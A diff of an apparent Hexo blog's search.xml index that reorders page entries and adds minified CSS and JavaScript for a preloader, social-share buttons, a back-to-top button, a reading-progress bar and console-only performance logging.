     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\node_modules\aplayer\dist\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\node_modules\aplayer\dist\Meting.min.js"></script>]]></content>
-  </entry>
-  <entry>
-    <title></title>
-    <url>/css/back-to-top.css</url>
-    <content><![CDATA[]]></content>
-  </entry>
-  <entry>
-    <title>Categories</title>
-    <url>/categories/index.html</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\node_modules\aplayer\dist\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\node_modules\aplayer\dist\Meting.min.js"></script>]]></content>
-  </entry>
-  <entry>
-    <title></title>
-    <url>/css/custom-preloader.css</url>
-    <content><![CDATA[.preloader{background-color:#0f172a!important;background-image:linear-gradient(135deg,rgba(15,23,42,.97) 0,rgba(30,41,59,.97) 100%),url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='4' height='4' viewBox='0 0 4 4'%3E%3Cpath fill='%234b5563' fill-opacity='0.1' d='M1 3h1v1H1V3zm2-2h1v1H3V1z'%3E%3C/path%3E%3C/svg%3E")!important;transition:opacity .3s ease-out,visibility .3s ease-out!important;box-shadow:inset 0 0 100px rgba(0,0,0,.3)}.ml13{font-size:2.2rem!important;font-weight:300!important;letter-spacing:.08em;line-height:1.4;color:rgba(226,232,240,.95)!important;text-shadow:0 2px 8px rgba(0,0,0,.3),0 0 2px rgba(148,163,184,.3);margin-bottom:1.5rem;max-width:85%}.letter{display:inline-block;opacity:0;transform:translateX(-.2em);filter:blur(4px);animation:fadeInFromLeft .4s forwards;animation-delay:calc(var(--index) * .03s);color:rgba(226,232,240,.95);text-shadow:0 0 10px rgba(148,163,184,.4)}@keyframes fadeInFromLeft{0%{opacity:0;transform:translateX(-.3em);filter:blur(6px)}60%{opacity:.8;transform:translateX(0);filter:blur(2px);color:rgba(248,250,252,.98);text-shadow:0 0 8px rgba(186,230,253,.7)}100%{opacity:1;transform:translateX(0);filter:blur(0);color:rgba(226,232,240,.95);text-shadow:0 2px 8px rgba(0,0,0,.3),0 0 2px rgba(148,163,184,.3)}}@media (max-width:768px){.ml13{font-size:1.8rem!important;margin-bottom:0}}]]></content>
-  </entry>
-  <entry>
-    <title></title>
-    <url>/css/custom-styles.css</url>
-    <content><![CDATA[]]></content>
   </entry>
   <entry>
     <title>About Me</title>
@@ -1779,19 +1759,49 @@
 ]]></content>
   </entry>
   <entry>
-    <title></title>
-    <url>/css/reading-progress.css</url>
-    <content><![CDATA[]]></content>
-  </entry>
-  <entry>
-    <title></title>
-    <url>/js/back-to-top.js</url>
-    <content><![CDATA[]]></content>
+    <title>Categories</title>
+    <url>/categories/index.html</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\node_modules\aplayer\dist\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\node_modules\aplayer\dist\Meting.min.js"></script>]]></content>
   </entry>
   <entry>
     <title></title>
     <url>/css/social-share.css</url>
+    <content><![CDATA[.social-share{display:flex;gap:.5rem;margin:1rem 0;flex-wrap:wrap}.social-share-btn{display:inline-flex;align-items:center;justify-content:center;padding:.5rem 1rem;border:none;border-radius:.375rem;font-size:.875rem;font-weight:500;text-decoration:none;color:#fff;cursor:pointer;transition:all .2s ease;min-width:2.5rem;height:2.5rem}.social-share-btn:hover{transform:translateY(-1px);box-shadow:0 4px 8px rgba(0,0,0,.2)}.social-share-btn.twitter{background-color:#1da1f2}.social-share-btn.facebook{background-color:#1877f2}.social-share-btn.linkedin{background-color:#0a66c2}.social-share-btn.telegram{background-color:#08c}.social-share-btn.copy{background-color:#6b7280}.social-share-btn:hover.twitter{background-color:#0c8de4}.social-share-btn:hover.facebook{background-color:#166fe5}.social-share-btn:hover.linkedin{background-color:#004182}.social-share-btn:hover.telegram{background-color:#0077b5}.social-share-btn:hover.copy{background-color:#4b5563}@media (max-width:768px){.social-share{justify-content:center}.social-share-btn{flex:1;min-width:0;max-width:3rem}}]]></content>
+  </entry>
+  <entry>
+    <title></title>
+    <url>/css/custom-preloader.css</url>
+    <content><![CDATA[.preloader{background-color:#0f172a!important;background-image:linear-gradient(135deg,rgba(15,23,42,.97) 0,rgba(30,41,59,.97) 100%),url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='4' height='4' viewBox='0 0 4 4'%3E%3Cpath fill='%234b5563' fill-opacity='0.1' d='M1 3h1v1H1V3zm2-2h1v1H3V1z'%3E%3C/path%3E%3C/svg%3E")!important;transition:opacity .3s ease-out,visibility .3s ease-out!important;box-shadow:inset 0 0 100px rgba(0,0,0,.3)}.ml13{font-size:2.2rem!important;font-weight:300!important;letter-spacing:.08em;line-height:1.4;color:rgba(226,232,240,.95)!important;text-shadow:0 2px 8px rgba(0,0,0,.3),0 0 2px rgba(148,163,184,.3);margin-bottom:1.5rem;max-width:85%}.letter{display:inline-block;opacity:0;transform:translateX(-.2em);filter:blur(4px);animation:fadeInFromLeft .4s forwards;animation-delay:calc(var(--index) * .03s);color:rgba(226,232,240,.95);text-shadow:0 0 10px rgba(148,163,184,.4)}@keyframes fadeInFromLeft{0%{opacity:0;transform:translateX(-.3em);filter:blur(6px)}60%{opacity:.8;transform:translateX(0);filter:blur(2px);color:rgba(248,250,252,.98);text-shadow:0 0 8px rgba(186,230,253,.7)}100%{opacity:1;transform:translateX(0);filter:blur(0);color:rgba(226,232,240,.95);text-shadow:0 2px 8px rgba(0,0,0,.3),0 0 2px rgba(148,163,184,.3)}}@media (max-width:768px){.ml13{font-size:1.8rem!important;margin-bottom:0}}]]></content>
+  </entry>
+  <entry>
+    <title></title>
+    <url>/css/back-to-top.css</url>
+    <content><![CDATA[.back-to-top-btn{position:fixed;bottom:20px;right:20px;width:50px;height:50px;border:none;border-radius:50%;background:linear-gradient(135deg,#0ea5e9,#3b82f6);color:#fff;font-size:20px;font-weight:700;cursor:pointer;opacity:0;visibility:hidden;transition:all .3s ease;z-index:1000;box-shadow:0 4px 12px rgba(14,165,233,.3)}.back-to-top-btn:hover{transform:translateY(-2px);box-shadow:0 6px 20px rgba(14,165,233,.4);background:linear-gradient(135deg,#0284c7,#2563eb)}.back-to-top-btn.show{opacity:1;visibility:visible}.back-to-top-btn:active{transform:translateY(0)}@media (prefers-color-scheme:dark){.back-to-top-btn{background:linear-gradient(135deg,#1e40af,#7c3aed);box-shadow:0 4px 12px rgba(30,64,175,.3)}.back-to-top-btn:hover{background:linear-gradient(135deg,#1d4ed8,#8b5cf6);box-shadow:0 6px 20px rgba(30,64,175,.4)}}@media (max-width:768px){.back-to-top-btn{width:45px;height:45px;bottom:15px;right:15px;font-size:18px}}]]></content>
+  </entry>
+  <entry>
+    <title></title>
+    <url>/css/reading-progress.css</url>
+    <content><![CDATA[.reading-progress-bar{position:fixed;top:0;left:0;width:0%;height:3px;background:linear-gradient(90deg,#0ea5e9,#3b82f6,#8b5cf6);z-index:9999;transition:width .2s ease-out;opacity:.9}.reading-progress-bar::after{content:'';position:absolute;top:0;left:0;right:0;bottom:0;background:linear-gradient(90deg,transparent,rgba(255,255,255,.3),transparent);animation:shimmer 2s infinite}@keyframes shimmer{0%{transform:translateX(-100%)}100%{transform:translateX(100%)}}.reading-progress-circle{position:fixed;bottom:20px;right:80px;width:50px;height:50px;background:rgba(255,255,255,.9);border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:12px;font-weight:700;color:#0ea5e9;box-shadow:0 4px 12px rgba(0,0,0,.1);opacity:0;visibility:hidden;transition:all .3s ease;z-index:998}.reading-progress-circle.show{opacity:1;visibility:visible}.reading-progress-circle svg{position:absolute;top:0;left:0;transform:rotate(-90deg)}.reading-progress-circle .progress-circle{fill:none;stroke:#e5e7eb;stroke-width:3}.reading-progress-circle .progress-circle.active{stroke:#0ea5e9;stroke-linecap:round;transition:stroke-dasharray .3s ease}@media (prefers-color-scheme:dark){.reading-progress-bar{background:linear-gradient(90deg,#60a5fa,#a78bfa,#f472b6)}.reading-progress-circle{background:rgba(31,41,55,.9);color:#60a5fa}.reading-progress-circle .progress-circle{stroke:#374151}.reading-progress-circle .progress-circle.active{stroke:#60a5fa}}@media (max-width:768px){.reading-progress-bar{height:2px}.reading-progress-circle{width:40px;height:40px;bottom:15px;right:70px;font-size:10px}}]]></content>
+  </entry>
+  <entry>
+    <title></title>
+    <url>/css/custom-styles.css</url>
     <content><![CDATA[]]></content>
+  </entry>
+  <entry>
+    <title>My Friends &amp; Teammates</title>
+    <url>/links/index.html</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\node_modules\aplayer\dist\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\node_modules\aplayer\dist\Meting.min.js"></script>]]></content>
+  </entry>
+  <entry>
+    <title>Tags</title>
+    <url>/tags/index.html</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\node_modules\aplayer\dist\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\node_modules\aplayer\dist\Meting.min.js"></script>]]></content>
+  </entry>
+  <entry>
+    <title></title>
+    <url>/js/analytics/performance.js</url>
+    <content><![CDATA[(()=>{if(window.addEventListener("load",function(){setTimeout(function(){if(performance&&performance.timing){var o=performance.timing,e=o.loadEventEnd-o.navigationStart,n=o.domainLookupEnd-o.domainLookupStart,t=o.connectEnd-o.connectStart,a=o.responseStart-o.requestStart,o=o.domComplete-o.domLoading;if("localhost"!==window.location.hostname&&"127.0.0.1"!==window.location.hostname||(console.log("Performance Metrics:"),console.log("- Page load time: "+e+"ms"),console.log("- DNS lookup time: "+n+"ms"),console.log("- TCP connection time: "+t+"ms"),console.log("- Time to first byte: "+a+"ms"),console.log("- DOM processing time: "+o+"ms")),"undefined"!=typeof web_vitals&&web_vitals)try{web_vitals.getCLS&&web_vitals.getCLS(function(o){console.log("CLS:",o.value)}),web_vitals.getFID&&web_vitals.getFID(function(o){console.log("FID:",o.value)}),web_vitals.getLCP&&web_vitals.getLCP(function(o){console.log("LCP:",o.value)})}catch(o){console.warn("Error collecting Web Vitals:",o)}performance.memory&&(e=performance.memory,console.log("Memory usage:"),console.log("- Used: "+Math.round(e.usedJSHeapSize/1048576)+"MB"),console.log("- Total: "+Math.round(e.totalJSHeapSize/1048576)+"MB"),console.log("- Limit: "+Math.round(e.jsHeapSizeLimit/1048576)+"MB"))}else console.warn("Performance API not available")},100)}),"PerformanceObserver"in window)try{new PerformanceObserver(function(o){o.getEntries().forEach(function(o){50<o.duration&&console.warn("Long task detected:",o.duration+"ms",o)})}).observe({entryTypes:["longtask"]})}catch(o){console.warn("Performance observer not supported:",o)}})();]]></content>
   </entry>
   <entry>
     <title>Projects</title>
@@ -1809,29 +1819,55 @@
 ]]></content>
   </entry>
   <entry>
-    <title>My Friends &amp; Teammates</title>
-    <url>/links/index.html</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\node_modules\aplayer\dist\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\node_modules\aplayer\dist\Meting.min.js"></script>]]></content>
+    <title></title>
+    <url>/js/back-to-top.js</url>
+    <content><![CDATA[(()=>{let e=document.createElement("button");e.innerHTML="↑",e.className="back-to-top-btn",e.style.cssText=`
+    position: fixed;
+    bottom: 20px;
+    right: 20px;
+    width: 50px;
+    height: 50px;
+    border: none;
+    border-radius: 50%;
+    background: #0ea5e9;
+    color: white;
+    font-size: 20px;
+    cursor: pointer;
+    opacity: 0;
+    transition: opacity 0.3s ease;
+    z-index: 1000;
+    display: none;
+  `,document.body.appendChild(e),window.addEventListener("scroll",function(){300<window.pageYOffset?(e.style.display="block",e.style.opacity="1"):(e.style.opacity="0",setTimeout(()=>{window.pageYOffset<=300&&(e.style.display="none")},300))}),e.addEventListener("click",function(){window.scrollTo({top:0,behavior:"smooth"})})})();]]></content>
   </entry>
   <entry>
     <title></title>
     <url>/js/reading-progress.js</url>
-    <content><![CDATA[]]></content>
-  </entry>
-  <entry>
-    <title>Tags</title>
-    <url>/tags/index.html</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\node_modules\aplayer\dist\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\node_modules\aplayer\dist\Meting.min.js"></script>]]></content>
-  </entry>
-  <entry>
-    <title></title>
-    <url>/js/analytics/performance.js</url>
-    <content><![CDATA[// Performance monitoring script\nwindow.addEventListener('load', function() {\n  setTimeout(function() {\n    var t = performance.timing;\n    var pageLoadTime = t.loadEventEnd - t.navigationStart;\n    var dnsTime = t.domainLookupEnd - t.domainLookupStart;\n    var tcpTime = t.connectEnd - t.connectStart;\n    var ttfb = t.responseStart - t.requestStart;\n    var domLoadTime = t.domComplete - t.domLoading;\n\n    console.log('Page load time: ' + pageLoadTime + 'ms');\n    console.log('DNS lookup time: ' + dnsTime + 'ms');\n    console.log('TCP connection time: ' + tcpTime + 'ms');\n    console.log('Time to first byte: ' + ttfb + 'ms');\n    console.log('DOM processing time: ' + domLoadTime + 'ms');\n\n    // Collect Core Web Vitals\n    if (typeof web_vitals !== 'undefined') {\n      web_vitals.getCLS(console.log);\n      web_vitals.getFID(console.log);\n      web_vitals.getLCP(console.log);\n    }\n  }, 0);\n});
-]]></content>
+    <content><![CDATA[(()=>{let i=document.createElement("div");function e(){var e="/"===window.location.pathname||"/index.html"===window.location.pathname,n=document.documentElement.scrollHeight,t=window.innerHeight;i.style.display=e||n<=1.2*t?"none":"block"}i.className="reading-progress-bar",i.style.cssText=`
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 0%;
+    height: 3px;
+    background: linear-gradient(90deg, #0ea5e9, #3b82f6);
+    z-index: 9999;
+    transition: width 0.1s ease;
+  `,document.body.appendChild(i),window.addEventListener("scroll",function(){var e=window.innerHeight,e=document.documentElement.scrollHeight-e,e=window.pageYOffset/e*100;i.style.width=Math.min(e,100)+"%"}),window.addEventListener("load",e),window.addEventListener("resize",e),e()})();]]></content>
   </entry>
   <entry>
     <title></title>
     <url>/js/social-share.js</url>
-    <content><![CDATA[]]></content>
+    <content><![CDATA[(()=>{let o={twitter:function(e){e=`https://twitter.com/intent/tweet?text=${encodeURIComponent(e.title)}&url=`+encodeURIComponent(e.url);window.open(e,"_blank","width=600,height=400")},facebook:function(e){e="https://www.facebook.com/sharer/sharer.php?u="+encodeURIComponent(e.url);window.open(e,"_blank","width=600,height=400")},linkedin:function(e){e="https://www.linkedin.com/sharing/share-offsite/?url="+encodeURIComponent(e.url);window.open(e,"_blank","width=600,height=400")},telegram:function(e){e=`https://t.me/share/url?url=${encodeURIComponent(e.url)}&text=`+encodeURIComponent(e.title);window.open(e,"_blank","width=600,height=400")},copy:function(e){var t;navigator.clipboard?navigator.clipboard.writeText(e.url).then(()=>{n("Link copied to clipboard!")}):((t=document.createElement("textarea")).value=e.url,document.body.appendChild(t),t.select(),document.execCommand("copy"),document.body.removeChild(t),n("Link copied to clipboard!"))}};function n(e){let t=document.createElement("div");t.textContent=e,t.style.cssText=`
+      position: fixed;
+      bottom: 20px;
+      left: 50%;
+      transform: translateX(-50%);
+      background: #333;
+      color: white;
+      padding: 12px 24px;
+      border-radius: 6px;
+      z-index: 10000;
+      opacity: 0;
+      transition: opacity 0.3s ease;
+    `,document.body.appendChild(t),setTimeout(()=>t.style.opacity="1",10),setTimeout(()=>{t.style.opacity="0",setTimeout(()=>document.body.removeChild(t),300)},2e3)}document.addEventListener("DOMContentLoaded",function(){document.querySelectorAll("[data-share]").forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var e=this.getAttribute("data-share"),t={url:window.location.href,title:document.title,description:document.querySelector('meta[name="description"]')?.content||"",image:document.querySelector('meta[property="og:image"]')?.content||""};o[e]&&o[e](t)})})})})();]]></content>
   </entry>
 </search>
